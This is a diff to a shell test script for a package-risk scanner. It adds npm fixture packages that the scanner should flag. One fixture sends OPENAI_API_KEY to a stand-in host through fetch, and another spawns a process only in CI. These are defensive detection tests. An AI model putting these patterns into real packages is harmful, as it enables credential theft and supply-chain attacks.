@@ -86,6 +86,62 @@ JS
 run_capture 22 "$WORK_DIR/npm-decoy.json" "$CLI" package-risk assess --workspace "$NPM_DECOY" --ecosystem npm --state-dir "$STATE_DIR" --json
 require_contains 'npm_lifecycle_script_prepare' "$WORK_DIR/npm-decoy.json" npm_prepare
 
+NPM_API_COMPAT="$WORK_DIR/npm-api-compatible"
+mkdir -p "$NPM_API_COMPAT"
+cat >"$NPM_API_COMPAT/package.json" <<'JSON'
+{"name":"npm-api-compatible-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"index.js"}
+JSON
+cat >"$NPM_API_COMPAT/index.js" <<'JS'
+class Client {
+  list() {
+    return fetch("https://example.invalid/collect?token=" + process.env.OPENAI_API_KEY);
+  }
+}
+module.exports = { Client };
+JS
+run_capture 22 "$WORK_DIR/npm-api-compatible.json" "$CLI" package-risk assess --workspace "$NPM_API_COMPAT" --ecosystem npm --state-dir "$STATE_DIR" --json
+require_contains 'credential_or_environment_access' "$WORK_DIR/npm-api-compatible.json" npm_api_secret
+require_contains 'network_capability_observed' "$WORK_DIR/npm-api-compatible.json" npm_api_network
+
+NPM_CI_DELAY="$WORK_DIR/npm-ci-delay"
+mkdir -p "$NPM_CI_DELAY"
+cat >"$NPM_CI_DELAY/package.json" <<'JSON'
+{"name":"npm-ci-delay-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"index.js"}
+JSON
+cat >"$NPM_CI_DELAY/index.js" <<'JS'
+if (process.env.CI === "true") {
+  require("child_process").exec("echo delayed");
+}
+JS
+run_capture 22 "$WORK_DIR/npm-ci-delay.json" "$CLI" package-risk assess --workspace "$NPM_CI_DELAY" --ecosystem npm --state-dir "$STATE_DIR" --json
+require_contains 'delayed_ci_activation_marker' "$WORK_DIR/npm-ci-delay.json" npm_ci_marker
+require_contains 'process_spawn_capability_observed' "$WORK_DIR/npm-ci-delay.json" npm_ci_spawn
+
+NPM_MACOS_ONLY="$WORK_DIR/npm-macos-only"
+mkdir -p "$NPM_MACOS_ONLY"
+cat >"$NPM_MACOS_ONLY/package.json" <<'JSON'
+{"name":"npm-macos-only-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"main":"darwin_payload.js"}
+JSON
+cat >"$NPM_MACOS_ONLY/darwin_payload.js" <<'JS'
+if (process.platform === "darwin") {
+  module.exports = "activated";
+}
+JS
+run_capture 22 "$WORK_DIR/npm-macos-only.json" "$CLI" package-risk assess --workspace "$NPM_MACOS_ONLY" --ecosystem npm --state-dir "$STATE_DIR" --json
+require_contains 'platform_specific_macos_marker' "$WORK_DIR/npm-macos-only.json" npm_macos_marker
+
+NPM_NATIVE="$WORK_DIR/npm-native"
+mkdir -p "$NPM_NATIVE"
+cat >"$NPM_NATIVE/package.json" <<'JSON'
+{"name":"npm-native-fixture","version":"1.0.0","whoatherePublishedAtUnixSeconds":1700000000,"gypfile":true}
+JSON
+touch "$NPM_NATIVE/binding.gyp"
+touch "$NPM_NATIVE/addon.node"
+run_capture 22 "$WORK_DIR/npm-native.json" "$CLI" package-risk assess --workspace "$NPM_NATIVE" --ecosystem npm --state-dir "$STATE_DIR" --json
+require_contains 'native_extension_marker' "$WORK_DIR/npm-native.json" npm_native_marker
+require_contains 'native_or_binary_payload_marker' "$WORK_DIR/npm-native.json" npm_binary_marker
+require_contains 'native_extension_requires_manual_review' "$WORK_DIR/npm-native.json" npm_native_review
+
 PTH="$WORK_DIR/python-pth"
 make_pyproject "$PTH" "python_pth_fixture"
 cat >"$PTH/sitecustomize.pth" <<'PY'
